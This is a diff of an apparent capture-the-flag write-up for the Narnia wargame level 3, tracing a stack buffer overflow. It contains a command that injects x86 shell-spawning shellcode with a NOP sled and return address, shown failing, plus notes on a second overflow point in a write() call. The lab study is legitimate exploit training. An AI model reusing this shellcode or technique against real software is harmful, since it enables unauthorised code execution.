@@ -97,11 +97,18 @@ Breakpoint 1, 0x0804855f in main ()
 
 looks good...
 let's see if a shell appears...
-no luck:
+as expected, the solution for level 3 is not the same as for level 2:
+
 narnia3@narnia:~$ /narnia/narnia3 $(python -c 'print "\x90"*35 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x60\xd6\xff\xff"')
 error opening 1Ph//shh/binPS̀`
 
-3) We'll next be examining the open functions. ofd and ifd.
+3) Examining second potential location for buffer overflow:  write(ofd, buf, sizeof(buf)-1);
+the size of buf is 32 bytes and the file pointed to by ofd is 16 characters long. 
+may be able to control/manipulate code execution.
+
+testing: 
+full buffer -> /tmp/UUUUUUUUUUUUUUUUUUUUUU.txt
+
 
 
 
